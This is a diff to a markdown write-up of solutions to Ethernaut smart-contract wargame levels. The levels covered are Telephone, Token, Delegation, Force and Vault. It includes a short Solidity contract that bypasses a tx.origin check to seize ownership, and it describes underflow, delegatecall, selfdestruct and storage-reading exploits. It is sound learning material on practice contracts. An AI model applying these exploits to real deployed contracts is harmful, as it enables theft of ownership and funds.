@@ -109,8 +109,6 @@ await contract.owner()
 ```
 I got my address as the output, confirming that I am now the owner of the contract
 
-To check that I successfully became the owner after calling `Fal1out()`.
-
 ---
 
 ### Level completed
@@ -143,7 +141,7 @@ I used this command 10 times to check the `consecutiveWins` value after each fli
 
 ---
 
-## Level completed
+### Level completed
 ![Level Complete Output](assets/Coin_Flip.png)
 ![2](assets/Coin_Flip(1).png)
 
@@ -160,26 +158,22 @@ In this challenge, the `Telephone` contract has a function `changeOwner()` that 
 
 ---
 
-## Commands Used
-
-### 1. Creating an Interface to Interact with the `Telephone` Contract
+### Exploit contract
 ```solidity
-interface ITelephone {
-  function changeOwner(address _owner) external;
+// SPDX-License-Identifier: MIT
+pragma solidity ^0.8.0;
+
+interface Telephone {
+    function changeOwner(address _owner) external;
+}
+
+contract TelephoneH {
+    function attack(address _target) public {
+        Telephone(_target).changeOwner(msg.sender);
+    }
 }
 ```
-I created an interface (`ITelephone`) to interact with the `Telephone` contract. This allows me to call the `changeOwner()` function on the contract from another contract.
 
----
-
-### 2. Intermediate Contract to Exploit the Vulnerability
-```solidity
-contract IntermediateContract {
-  function changeOwner(address _addr) public {
-    ITelephone(_addr).changeOwner(msg.sender);
-  }
-}
-```
 This contract acts as an intermediary. It calls the `changeOwner()` function of the target `Telephone` contract, passing the caller's address (`msg.sender`) as the new owner. Since the check `tx.origin != msg.sender` is bypassed, the ownership is transferred successfully.
 
 ---
@@ -189,7 +183,7 @@ This contract acts as an intermediary. It calls the `changeOwner()` function of 
 - By using an intermediate contract, I bypassed this check because `msg.sender` (the contract address) is different from `tx.origin` (my address). The intermediate contract successfully called the `changeOwner()` function, transferring the ownership of the `Telephone` contract to my address.
 
 ### 3. Executing in Remix IDE
-After deploying both the `Telephone` contract and the `IntermediateContract` on Remix IDE, I called the `changeOwner()` function on the intermediate contract to transfer ownership of the `Telephone` contract to my address.
+After deploying both the `Telephone` contract and the `TelephoneH` on Remix IDE, I called the `changeOwner()` function on the intermediate contract to transfer ownership of the `Telephone` contract to my address.
 
 ---
 
@@ -199,7 +193,7 @@ After deploying both the `Telephone` contract and the `IntermediateContract` on 
 await contract.owner()
 ```
 
-## Level completed
+### Level completed
 ![Level Complete Output](assets/Telephone.png)
 
 
@@ -207,7 +201,7 @@ await contract.owner()
 
 ## Strategy
 
-- **Vulnerability**: The `transfer` function in the contract does not safely check for underflows. It subtracts the transfer amount from the sender’s balance before performing the check, and since the Solidity version is ^0.6.0 (before built-in overflow checks), this leads to an integer underflow vulnerability.
+- **Vulnerability**: The `transfer` function in the contract does not safely check for underflows. It subtracts the transfer amount from the sender’s balance before performing the check, and since the Solidity version is ^0.6.0 , this leads to an integer underflow vulnerability.
 - **Exploit**: By trying to transfer more tokens than I actually had (21 tokens when I only had 20), the subtraction underflows and sets my balance to a very large number, allowing me to pass the level.
 
 ---
@@ -238,9 +232,8 @@ To verify that my token balance is now much larger than the original 20 tokens.
 
 ---
 
-## Level completed
+### Level completed
 ![Level Complete Output](assets/Token.png)
-
 
 
 # Ethernaut Level 6: Delegation
@@ -274,7 +267,7 @@ To specify the instance we are attacking.
 ```js
 let player = (await web3.eth.getAccounts())[0];
 ```
-To get the sender address (your player address).
+To get the sender address(player address).
 
 ---
 
@@ -298,7 +291,7 @@ To verify that the `owner` is now the player.
 
 ---
 
-## Level completed
+### Level completed
 ![Level Complete Output](assets/Delegation.png)
 
 
@@ -331,7 +324,6 @@ The `destroy()` function will forcefully send ETH to the `Force` contract's addr
 ---
 
 ### 2. Deployed `ForceAttack` with 1 Wei
-
 To give the contract some balance that it can push to the target via `selfdestruct`.
 
 ---
@@ -352,7 +344,7 @@ This confirms the ETH was successfully transferred and the level is complete.
 
 ---
 
-## Level completed
+### Level completed
 ![Level Complete Output](assets/Force.png)
 
 # Ethernaut Level 8: Vault
@@ -377,8 +369,8 @@ The password is stored at slot 1. This reveals the raw `bytes32` value.
 ### 2. Decode the password to readable ASCII
 ```js
 web3.utils.hexToAscii("0x...")  // Use the result from the previous step
+//Output: `"A very strong secret password : )"`
 ```
-**Output**: `"A very strong secret password : )"`
 
 ---
 
@@ -400,12 +392,12 @@ await contract.unlock(password);
 ### 5. Check if the vault is unlocked
 ```js
 await contract.locked();
+//Output: `false`
 ```
-**Output**: `false`
 
 ---
 
-## Level completed
+### Level completed
 ![Level Complete Output](assets/Vault.png)
 
 
